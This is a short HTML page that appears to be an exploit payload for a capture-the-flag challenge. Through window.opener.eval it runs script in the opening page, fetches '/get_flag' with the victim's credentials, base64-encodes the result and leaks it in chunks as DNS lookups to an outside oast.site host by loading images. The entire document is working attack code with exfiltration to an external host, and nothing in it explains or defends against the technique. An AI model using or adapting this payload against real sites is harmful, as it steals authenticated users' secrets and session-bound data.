<!DOCTYPE html>
<html><body><script>
if (window.opener) {
  window.opener.eval(`
    (async () => {
      // 1) get the flag
      const res  = await fetch('/get_flag', { credentials: 'include' });
      const flag = await res.text();

      // 2) base64-encode and strip padding
      const data  = btoa(flag).replace(/=/g, '');
      const parts = data.match(/.{1,30}/g);  // splits into 30-char chunks

      // 3) keep images alive so each DNS request actually fires
      const imgs = [];
      for (let i = 0; i < parts.length; i++) {
        const sub = parts[i] + '.' + i + '.bkdxspdaaz5k3bcjumvu0si0h1d7zctqj.oast.site/';
        const img = new Image();
        img.src = 'http://' + sub;
        document.body.appendChild(img);  // append so GC canâ€™t throw it away
        imgs.push(img);
      }

      // Optional: expose for debugging
      window._leaked = { parts, imgs };
    })();
  `);
}
</script></body></html>
